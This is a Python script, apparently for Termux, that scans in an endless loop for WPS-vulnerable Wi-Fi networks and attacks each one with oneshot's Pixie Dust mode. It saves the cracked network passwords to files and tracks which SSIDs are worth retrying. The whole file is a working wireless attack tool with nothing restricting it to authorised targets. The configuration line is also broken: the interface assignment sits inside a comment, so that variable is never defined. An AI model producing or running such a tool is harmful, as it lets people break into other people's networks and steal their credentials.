#!/usr/bin/env python3
"""
pwnagotchi-like Termux app (text-based) with learning
- Uses `sudo oneshot -i wlan0` to discover networks
- Parses vulnerable networks by BSSID & SSID
- Cracks WPS with `sudo oneshot -i wlan0 -b <BSSID> -K`
- Logs each cycle with per-line entries (no clearing)
- Learns SSID success rates to skip poor targets
- Stores history in ~/.pwnagotchi_history.json
"""
import os
import sys
import subprocess
import time
import re
import json
from datetime import datetime

# Configuration\ nINTERFACE = os.environ.get('WIFI_INTERFACE', 'wlan0')
CRACKED_DIR = os.path.expanduser('~/cracked')
HISTORY_FILE = os.path.expanduser('~/.pwnagotchi_history.json')
SCAN_INTERVAL = 5          # seconds between cycles
SCAN_TIMEOUT = 20          # seconds for scan command
ATTACK_TIMEOUT = 10        # seconds per BSSID attack
ONESHOT_CMD = 'oneshot'

os.makedirs(CRACKED_DIR, exist_ok=True)

# Load or initialize history
def load_history():
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE) as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def save_history(hist):
    try:
        with open(HISTORY_FILE, 'w') as f:
            json.dump(hist, f)
    except Exception:
        pass

# Run oneshot scan to list networks, extract vulnerable ones
# Returns list of dicts: {'bssid', 'ssid'}
def get_vulnerable_networks():
    try:
        proc = subprocess.run(
            ['sudo', ONESHOT_CMD, '-i', INTERFACE],
            capture_output=True, text=True, timeout=SCAN_TIMEOUT
        )
        output = proc.stdout
    except subprocess.TimeoutExpired:
        return []
    except Exception:
        return []

    vulns = []
    for line in output.splitlines():
        if '\x1b[32m' in line or '[+]' in line:
            parts = line.split()
            m = re.search(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', line)
            if m and len(parts) >= 3:
                bssid = m.group(0)
                ssid = parts[2]
                vulns.append({'bssid': bssid, 'ssid': ssid})
    # unique by bssid
    seen = set(); unique = []
    for net in vulns:
        if net['bssid'] not in seen:
            seen.add(net['bssid']); unique.append(net)
    return unique

# Attack a single BSSID
def attack_network(bssid):
    try:
        proc = subprocess.run(
            ['sudo', ONESHOT_CMD, '-i', INTERFACE, '-b', bssid, '-K'],
            capture_output=True, text=True, timeout=ATTACK_TIMEOUT
        )
        return proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return ''
    except Exception:
        return ''

# Parse PSKs from output
def parse_psks(output):
    return re.findall(r'PSK:\s*(\S+)', output)

# Save cracked credentials
def save_crack(bssid, psk):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    fname = f"{ts}_{bssid.replace(':','')}.txt"
    with open(os.path.join(CRACKED_DIR, fname), 'w') as f:
        f.write(f"BSSID: {bssid}\nPSK: {psk}\n")

# Main loop
def main():
    if os.geteuid() != 0:
        print("[!] Please run as root (tsu)")
        sys.exit(1)

    history = load_history()
    cycle = 0

    print(f"[+] Starting on {INTERFACE}, history file: {HISTORY_FILE}\n")
    while True:
        cycle += 1
        ts = datetime.now().strftime('%H:%M:%S')
        nets = get_vulnerable_networks()
        total_targets = len(nets)
        print(f"[{ts}] Cycle {cycle}: Found {total_targets} vulnerable networks")

        for net in nets:
            bssid = net['bssid']; ssid = net['ssid']
            stats = history.get(ssid, {'attempts':0,'success':0})
            # Skip SSIDs with success rate < 20% after 5 attempts
            if stats['attempts'] >=5 and stats['success']/stats['attempts'] < 0.2:
                print(f"  [-] Skipping {ssid} (poor success rate)")
                continue

            print(f"  [~] Attacking {ssid} ({bssid})")
            stats['attempts'] +=1
            out = attack_network(bssid)
            psks = parse_psks(out)
            if psks:
                stats['success'] +=1
                for psk in psks:
                    save_crack(bssid, psk)
                    print(f"    [+] Cracked {ssid}: {psk}")
            else:
                print(f"    [-] Failed {ssid}")

            history[ssid] = stats
            save_history(history)

        print(f"[{ts}] Cycle {cycle} complete. Sleeping {SCAN_INTERVAL}s...\n")
        time.sleep(SCAN_INTERVAL)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exiting... Goodbye!")
